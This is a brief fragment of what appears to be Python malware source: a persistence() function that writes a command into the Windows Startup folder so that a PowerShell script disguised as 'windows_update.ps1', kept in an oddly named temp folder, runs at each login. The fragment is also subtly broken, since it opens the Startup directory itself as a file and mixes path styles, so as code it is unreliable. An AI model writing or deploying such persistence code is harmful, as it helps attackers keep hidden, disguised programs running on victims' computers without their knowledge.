...
def persistence():
    ...
    time.sleep(0.5)
    f = open("C:\\Users\\" + current_user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", 'w')
    time.sleep(0.5)
    f.write("PowerShell C:\\Users\\%userprofile%\\AppData\\Local\\Temp\\tmp_0x234692367923\\windows_update.ps1 >> “%TEMP%\StartupLog.txt” 2>&1")
    time.sleep(0.5)
